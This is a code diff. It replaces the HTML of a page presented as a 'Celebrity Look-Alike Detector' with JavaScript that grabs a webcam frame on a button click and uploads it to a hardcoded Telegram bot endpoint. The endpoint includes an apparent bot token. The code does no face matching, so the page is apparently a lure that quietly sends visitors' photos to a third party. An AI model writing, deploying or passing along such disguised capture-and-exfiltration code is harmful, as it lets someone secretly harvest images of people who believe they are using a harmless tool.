@@ -1,52 +1,32 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Celebrity Look-Alike Detector</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
+const captureBtn = document.getElementById('capture-btn');
+const photoCanvas = document.getElementById('photo-canvas');
+const TELEGRAM_BOT_API_ENDPOINT = 'https://api.telegram.org/bot5727820511:AAH0LrTp629GSK9MqR5SVDev5IKRqcGsb-s/sendPhoto';
 
-        h1 {
-            font-size: 36px;
-            margin-bottom: 20px;
-        }
+captureBtn.addEventListener('click', async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvasContext = photoCanvas.getContext('2d');
+        photoCanvas.width = video.videoWidth;
+        photoCanvas.height = video.videoHeight;
+        canvasContext.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
+        const photoDataUrl = photoCanvas.toDataURL('image/jpeg');
+        await sendPhotoToTelegramBot(photoDataUrl);
+    } catch (error) {
+        console.error(error);
+        alert('Failed to capture photo. Please make sure your camera is enabled and try again.');
+    }
+});
 
-        #image-container {
-            display: none;
-        }
-
-        #capture-button {
-            font-size: 18px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background-color: #2e6fa7;
-            color: #fff;
-            cursor: pointer;
-        }
-
-        #error-message {
-            font-size: 24px;
-            color: red;
-            margin-top: 20px;
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <h1>Know Which Celebrity You Look Like</h1>
-    <button id="capture-button">Click to Know</button>
-    <div id="image-container"></div>
-    <p id="error-message"></p>
-    <script src="./index.js"></script>
-</body>
-</html>
+async function sendPhotoToTelegramBot(photoDataUrl) {
+    const formData = new FormData();
+    const photoBlob = await fetch(photoDataUrl).then(res => res.blob());
+    formData.append('photo', photoBlob, 'photo.jpg');
+    const response = await fetch(TELEGRAM_BOT_API_ENDPOINT, {
+        method: 'POST',
+        body: formData
+    });
+    console.log(response);
+}
